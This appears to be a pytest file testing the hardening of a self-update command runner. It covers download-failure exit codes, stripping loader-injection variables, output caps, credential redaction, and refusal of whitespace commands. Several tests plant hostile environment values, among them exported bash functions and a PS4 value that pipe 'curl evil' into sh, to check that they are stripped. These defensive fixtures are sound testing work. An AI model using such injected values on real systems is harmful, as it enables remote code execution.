    @pytest.mark.asyncio
    async def test_apply_policy_update_returns_none_without_provider(self) -> None:
        from kiro_crew.platform.governance import UpdatePins
        from kiro_crew.platform.update_provider import apply_policy_update

        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(),
        ):
            assert await apply_policy_update() is None

    @pytest.mark.asyncio
    async def test_apply_policy_update_delegates_when_configured(self) -> None:
        from kiro_crew.platform.governance import UpdatePins
        from kiro_crew.platform.update_provider import apply_policy_update

        pins = UpdatePins(check_command="c", apply_command="a")
        with (
            patch("kiro_crew.platform.governance.active_update_pins", return_value=pins),
            patch.object(CommandProvider, "apply", AsyncMock(return_value=True)) as ap,
        ):
            assert await apply_policy_update() is True
        ap.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_provider_failure_is_reported_not_swallowed(self) -> None:
        """False must reach the caller so it can refuse to fall back."""
        from kiro_crew.platform.governance import UpdatePins
        from kiro_crew.platform.update_provider import apply_policy_update

        pins = UpdatePins(apply_command="a")
        with (
            patch("kiro_crew.platform.governance.active_update_pins", return_value=pins),
            patch.object(CommandProvider, "apply", AsyncMock(return_value=False)),
        ):
            assert await apply_policy_update() is False


class TestWheelUpdateCommandPropagatesDownloadFailure:
    """`curl … | sh` reports sh's status, and a shell handed empty input exits 0,
    so a CDN failure looked like a successful update: version unchanged, gateway
    restarted, check still saw an update, unattended path looped."""

    def test_download_status_is_not_swallowed_by_the_pipe(self) -> None:
        """The invariant is that the DOWNLOAD's failure fails the command, not
        that no pipe appears. A bare `curl … | sh` reports only sh's status; a
        pipe fed from an already-checked variable does not, because the fetch
        ran (and could abort) in the command substitution first."""
        from kiro_crew.platform.update_layout import wheel_update_command

        with patch(
            "kiro_crew.platform.update_layout.cdn_bases",
            return_value=("https://f", "https://a"),
        ):
            cmd = wheel_update_command("stable")
        assert "set -e" in cmd
        # curl's status is consumed by an assignment that `set -e` can abort on,
        # so its output is never piped straight into sh.
        assert '_kc_body="$(curl' in cmd
        assert "curl" not in cmd.split("|", 1)[1], "curl must not sit inside the pipeline"

    @_needs_posix_shell
    def test_download_failure_is_non_zero(self, tmp_path, monkeypatch) -> None:
        """Executed for real, but contained: a stub `curl` on a test-local PATH
        stands in for the network, and TMPDIR plus cwd keep `mktemp` and any
        stray write inside the test directory."""
        import subprocess

        from kiro_crew.platform.update_layout import wheel_update_command

        # Stub curl that fails like an unreachable host, so the assertion is
        # about OUR command's exit-status plumbing, not about the network.
        bin_dir = tmp_path / "bin"
        bin_dir.mkdir()
        fake_curl = bin_dir / "curl"
        fake_curl.write_text("#!/bin/sh\nexit 6\n")
        fake_curl.chmod(0o755)

        with patch(
            "kiro_crew.platform.update_layout.cdn_bases",
            return_value=("https://f", "https://cdn.invalid"),
        ):
            cmd = wheel_update_command("stable")
        shell = _shell_exec_args(cmd)
        assert shell is not None

        env = dict(os.environ)
        env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"
        env["TMPDIR"] = str(tmp_path)
        result = subprocess.run(shell, capture_output=True, cwd=tmp_path, env=env)
        assert result.returncode != 0, "a failed download must fail the command"


class TestTrustedEnvDropsLoaderInjection:
    """Narrowing PATH is not enough: PYTHONPATH plus a planted sitecustomize.py
    runs on every Python start, and LD_PRELOAD/DYLD_* do the same for any
    dynamically linked binary, so an update command that is a Python or shell
    wrapper would execute agent-writable code as the gateway."""

    def test_loader_variables_are_removed(self, monkeypatch) -> None:
        for var in (
            "PYTHONPATH",
            "PYTHONHOME",
            "LD_PRELOAD",
            "DYLD_INSERT_LIBRARIES",
            "BASH_ENV",
            "IFS",
        ):
            monkeypatch.setenv(var, "/tmp/agent-writable")
        monkeypatch.setenv("LANG", "C.UTF-8")
        with patch(
            "kiro_crew.platform.update_provider.trusted_system_path",
            return_value="/usr/bin:/bin",
        ):
            env = _trusted_path_env()
        assert env is not None
        for var in (
            "PYTHONPATH",
            "PYTHONHOME",
            "LD_PRELOAD",
            "DYLD_INSERT_LIBRARIES",
            "BASH_ENV",
            "IFS",
        ):
            assert var not in env, f"{var} must not reach the update command"
        # Benign variables a package manager needs still survive.
        assert env["LANG"] == "C.UTF-8"


class TestSpawnStartupErrorsAreVerdicts:
    """fd or process exhaustion raises an OSError that is not
    FileNotFoundError; a manual update must get an error verdict, not a crash."""

    @pytest.mark.asyncio
    async def test_check_returns_error_on_oserror(self) -> None:
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "c"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=OSError(24, "Too many open files")),
            ),
        ):
            result = await p.check()
        assert result.error and result.available is False

    @pytest.mark.asyncio
    async def test_apply_returns_false_on_oserror(self) -> None:
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=OSError(24, "Too many open files")),
            ),
        ):
            assert await p.apply() is False


class TestOutputIsBounded:
    """`communicate()` buffers a child's whole output in the gateway's memory
    with no bound, so a chatty package manager could exhaust it before the
    timeout fires. We keep a version string and a capped error summary."""

    @pytest.mark.asyncio
    async def test_huge_stdout_is_capped(self) -> None:
        from kiro_crew.platform.update_provider import (
            _MAX_CAPTURED_OUTPUT,
            _read_bounded_output,
        )

        proc = _fake_proc(stdout=b"x" * (_MAX_CAPTURED_OUTPUT * 4))
        out, _err = await _read_bounded_output(proc, timeout=5, want_stdout=True)
        assert len(out) == _MAX_CAPTURED_OUTPUT

    @pytest.mark.asyncio
    async def test_apply_discards_stdout_but_keeps_bounded_stderr(self) -> None:
        from kiro_crew.platform.update_provider import (
            _MAX_CAPTURED_OUTPUT,
            _read_bounded_output,
        )

        proc = _fake_proc(stdout=b"chatter" * 5000, stderr=b"e" * (_MAX_CAPTURED_OUTPUT * 2))
        out, err = await _read_bounded_output(proc, timeout=5, want_stdout=False)
        assert out == b"", "installer chatter nobody reads must not be buffered"
        assert len(err) == _MAX_CAPTURED_OUTPUT

    @pytest.mark.asyncio
    @_needs_posix_shell
    async def test_a_real_flood_does_not_deadlock_or_grow(self) -> None:
        """Executed for real: draining both pipes concurrently is what stops a
        full pipe buffer from wedging the child."""
        from kiro_crew.platform.update_provider import (
            _MAX_CAPTURED_OUTPUT,
            _read_bounded_output,
            _shell_exec_args,
        )

        argv = _shell_exec_args("yes FLOOD | head -c 4194304")
        assert argv is not None
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out, _err = await _read_bounded_output(proc, timeout=60, want_stdout=True)
        assert len(out) == _MAX_CAPTURED_OUTPUT
        assert proc.returncode == 0


class TestInstallerNeverLandsOnDisk:
    """The gateway and an agent share a uid, so a 0600 temp file does not keep
    the agent out: staging the installer to `mktemp` let it swap the contents
    between `curl` writing them and `sh` opening them. The body stays in memory
    instead, which removes the window rather than policing it."""

    def test_command_stages_no_file(self) -> None:
        from kiro_crew.platform.update_layout import wheel_update_command

        with patch(
            "kiro_crew.platform.update_layout.cdn_bases",
            return_value=("https://f", "https://cdn.invalid"),
        ):
            cmd = wheel_update_command("stable")
        assert "mktemp" not in cmd, "no writable temp file may hold the installer"
        assert " -o " not in cmd, "curl must not write the installer to a path"
        # stdin form: -s tells sh to read the script from stdin, -- passes the
        # rest to that script. The file form must NOT carry these.
        assert "sh -s --" in cmd

    def test_empty_body_is_rejected(self) -> None:
        """A shell handed empty input exits 0, which is the false success the
        piped form had; the command must test the body before running it."""
        from kiro_crew.platform.update_layout import wheel_update_command

        with patch(
            "kiro_crew.platform.update_layout.cdn_bases",
            return_value=("https://f", "https://cdn.invalid"),
        ):
            cmd = wheel_update_command("stable")
        assert 'test -n "$_kc_body"' in cmd

    @_needs_posix_shell
    def test_download_failure_still_fails_the_command(self, tmp_path) -> None:
        """Executed for real against a stub `curl` that fails: removing the temp
        file must not re-introduce the exit-status swallowing it was added for."""
        import subprocess

        from kiro_crew.platform.update_layout import wheel_update_command
        from kiro_crew.platform.update_provider import _shell_exec_args

        bin_dir = tmp_path / "bin"
        bin_dir.mkdir()
        fake_curl = bin_dir / "curl"
        fake_curl.write_text("#!/bin/sh\nexit 6\n")
        fake_curl.chmod(0o755)

        with patch(
            "kiro_crew.platform.update_layout.cdn_bases",
            return_value=("https://f", "https://cdn.invalid"),
        ):
            cmd = wheel_update_command("stable")
        argv = _shell_exec_args(cmd)
        assert argv is not None

        env = dict(os.environ)
        env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"
        env["TMPDIR"] = str(tmp_path)
        result = subprocess.run(argv, capture_output=True, cwd=tmp_path, env=env)
        assert result.returncode != 0, "a failed download must fail the command"
        # And nothing was staged on the way.
        assert not list((tmp_path).glob("tmp*"))


class TestPosixOnlyMarkerIsNotForgotten:
    """Three separate rounds of this PR each added a test that EXECUTES a
    generated command, and each passed locally on Linux while failing the Windows
    shard, because `_shell_exec_args` returns None there BY DESIGN. A Linux-only
    local run cannot catch that, so assert the coupling directly.

    The signal is deliberately "builds an argv AND spawns it", not "mentions
    `_shell_exec_args`": tests that only assert on its RETURN VALUE (such as the
    one pinning the Windows refusal) must keep running on Windows, since that is
    where the behaviour they check lives.
    """

    #: This guard's own body names the tokens it searches for, so it would match
    #: itself; its class is skipped by name rather than by weakening the search.
    _SELF_CLASS = "TestPosixOnlyMarkerIsNotForgotten"

    def test_every_command_executing_test_is_marked(self) -> None:
        import pathlib as _pathlib
        import re

        lines = _pathlib.Path(__file__).read_text().splitlines()
        # (line index, name) for every test function, plus the class it sits in.
        current_class = ""
        tests: list[tuple[int, str, str]] = []
        for i, line in enumerate(lines):
            cls = re.match(r"class (\w+)", line)
            if cls:
                current_class = cls.group(1)
                continue
            fn = re.match(r"    (?:async )?def (test_\w+)", line)
            if fn:
                tests.append((i, fn.group(1), current_class))

        offenders = []
        for idx, name, cls in tests:
            if cls == self._SELF_CLASS:
                continue
            # Walk UP from the def to collect its contiguous decorator lines.
            decorators = []
            j = idx - 1
            while (
                j >= 0
                and lines[j].strip().startswith(("@", ")", '"', "'"))
                or (
                    j >= 0
                    and lines[j].strip()
                    and not lines[j].strip().startswith("#")
                    and lines[j].startswith("        ")
                )
            ):
                decorators.append(lines[j])
                j -= 1
                if len(decorators) > 12:
                    break
            decorator_text = "\n".join(decorators)

            # Walk DOWN to the end of this test's body.
            end = len(lines)
            for k in range(idx + 1, len(lines)):
                stripped = lines[k]
                if (
                    stripped.strip()
                    and not stripped.startswith("        ")
                    and not stripped.startswith("    )")
                ):
                    end = k
                    break
            body = "\n".join(lines[idx:end])

            builds = "_shell_exec_args(" in body
            spawns = "subprocess.run(" in body or "create_subprocess_exec(" in body
            if not (builds and spawns):
                continue
            if "_needs_posix_shell" in decorator_text or "skipif" in decorator_text:
                continue
            offenders.append(name)

        assert not offenders, (
            "these tests build an argv with _shell_exec_args (None on Windows by "
            f"design) and spawn it, but lack @_needs_posix_shell: {offenders}"
        )


class TestWhitespaceCommandsAreNotPresence:
    """A whitespace-only command is truthy, so it would pass the presence check
    that SELECTS the provider, and `sh -c "   "` exits 0. That reads as a
    successful update: the gateway restarts, the version has not changed, the
    check still reports an update available, and the unattended path loops.
    Normalising at parse time makes absent and blank the same thing everywhere,
    matching how `source` and `min_version` were already handled."""

    def test_parse_strips_top_level_commands(self) -> None:
        from kiro_crew.platform.governance import UpdatePins

        pins = UpdatePins.from_dict({"apply_command": "   ", "check_command": "\t\n"})
        assert pins.apply_command == ""
        assert pins.check_command == ""

    def test_parse_strips_platform_commands(self) -> None:
        from kiro_crew.platform.governance import UpdatePins

        pins = UpdatePins.from_dict(
            {"platform_commands": {"linux-x86_64": {"apply_command": "  ", "check_command": " \t"}}}
        )
        assert pins.platform_commands["linux-x86_64"] == {
            "apply_command": "",
            "check_command": "",
        }

    def test_a_real_command_keeps_its_text(self) -> None:
        """Stripping must not corrupt a legitimate command."""
        from kiro_crew.platform.governance import UpdatePins

        pins = UpdatePins.from_dict({"apply_command": "  /usr/bin/pkg update  "})
        assert pins.apply_command == "/usr/bin/pkg update"

    def test_whitespace_policy_falls_through_to_legacy(self) -> None:
        """The end-to-end invariant: a blank policy must NOT select a provider,
        because a selected provider owns the update and never falls back."""
        from kiro_crew.platform.governance import UpdatePins

        pins = UpdatePins.from_dict(
            {
                "apply_command": "  ",
                "check_command": "\t",
                "platform_commands": {_current_platform_key(): {"apply_command": "  "}},
            }
        )
        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
            assert resolve_provider() is None


class TestRedactionHappensBeforeTruncation:
    """Slicing stderr to 500 chars BEFORE redacting can cut a credential in half,
    and half a token no longer matches the redactors' patterns, so the surviving
    fragment reaches gateway.log and /api/logs verbatim. Order, not presence, is
    what makes the redaction effective."""

    @pytest.mark.asyncio
    async def test_a_credential_straddling_the_cap_is_not_leaked(self, caplog) -> None:
        # An AWS-key-shaped secret positioned so the 500-char cap would bisect it.
        secret = "AKIAIOSFODNN7EXAMPLE"
        padding = "x" * (500 - len(secret) // 2)
        stderr = (padding + secret + " trailing").encode()

        provider = CommandProvider(check_command="c", apply_command="a")
        proc = _fake_proc(returncode=1, stderr=stderr)
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
            caplog.at_level(logging.ERROR),
        ):
            assert await provider.apply() is False

        logged = "\n".join(r.getMessage() for r in caplog.records)
        assert secret not in logged, "the whole secret must never be logged"
        # The real regression: the FRAGMENT left by a mid-token cut.
        assert secret[: len(secret) // 2] not in logged, (
            "a credential bisected by the 500-char cap leaked its prefix; "
            "redact before truncating"
        )

    def test_both_sites_redact_before_slicing(self) -> None:
        """Pins the ordering in source at both spawn sites, so a future edit that
        reintroduces `decode(...)[:500]` is caught even without a stderr fixture."""
        import inspect

        from kiro_crew.platform import update_provider as provider_mod
        from kiro_crew.slack import gateway as gateway_mod

        for module in (provider_mod, gateway_mod):
            src = inspect.getsource(module)
            assert (
                'decode(errors="replace")[:500]' not in src
            ), f"{module.__name__} truncates before redacting"


class TestCanApply:
    """``can_apply`` must mean "an Update button would actually work here".

    Two halves: an ``apply_command`` is configured, AND :func:`_shell_exec_args`
    can produce an argv for it. The second half is what keeps Windows honest —
    ``_shell_exec_args`` refuses every command there, so a configured
    ``apply_command`` must not render a button whose only possible outcome is
    ``policy_update_failed``.
    """

    def test_false_when_no_apply_command(self):
        assert update_provider.CommandProvider(check_command="check-cmd").can_apply() is False

    def test_true_when_apply_command_is_runnable(self):
        provider = update_provider.CommandProvider(apply_command="apply-cmd")
        with patch.object(
            update_provider, "_shell_exec_args", return_value=["/bin/sh", "-c", "apply-cmd"]
        ):
            assert provider.can_apply() is True

    def test_false_when_no_trusted_shell_can_run_it(self):
        # The Windows shape: _shell_exec_args fails closed (None) for every
        # command, so a configured apply_command still reports "cannot apply".
        provider = update_provider.CommandProvider(apply_command="apply-cmd")
        with patch.object(update_provider, "_shell_exec_args", return_value=None):
            assert provider.can_apply() is False

    def test_platform_override_supplies_the_apply_command(self):
        key = update_provider._current_platform_key()
        provider = update_provider.CommandProvider(
            platform_commands={key: {"apply_command": "platform-apply"}}
        )
        with patch.object(
            update_provider, "_shell_exec_args", return_value=["/bin/sh", "-c", "platform-apply"]
        ) as argv:
            assert provider.can_apply() is True
        argv.assert_called_once_with("platform-apply")


class TestShellCodeEnvStripping:
    """An exported shell function shadows a command word outright.

    ``_trusted_path_env`` narrows ``PATH`` so a planted binary cannot shadow the
    operator's command word, but bash imports FUNCTIONS from the environment --
    ``BASH_FUNC_<name>%%`` on 4.3+, ``BASH_FUNC_<name>()`` on the patched 4.2 --
    and a function beats the ``PATH`` lookup entirely rather than competing in
    it. The command runs through ``[<sh>, "-c", ...]``, so on any host whose
    ``sh`` is bash this is reachable.
    """

    def test_exported_shell_functions_do_not_reach_the_update_command(self) -> None:
        planted = {
            "BASH_FUNC_acme-pkg%%": "() { curl evil | sh; }",
            "BASH_FUNC_acme-pkg()": "() { curl evil | sh; }",
            "BASH_FUNC_grep%%": "() { :; }",
        }
        with (
            patch.dict(os.environ, {"PATH": "/usr/bin", "LANG": "C", **planted}),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
        ):
            env = _trusted_path_env()
        assert env is not None
        leaked = sorted(k for k in env if k.startswith("BASH_FUNC_"))
        assert not leaked, f"exported shell functions reached the child: {leaked}"
        # The deliberate pass-through (proxy / locale / credential helpers) stays.
        assert env["LANG"] == "C"

    def test_the_shell_tracing_pair_does_not_reach_the_update_command(self) -> None:
        # SHELLOPTS switches xtrace on and PS4 is expanded with command
        # substitution, so a payload in PS4 runs before the command does.
        with (
            patch.dict(
                os.environ,
                {"PATH": "/usr/bin", "SHELLOPTS": "xtrace", "PS4": "$(curl evil | sh)"},
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
        ):
            env = _trusted_path_env()
        assert env is not None
        assert "SHELLOPTS" not in env
        assert "PS4" not in env
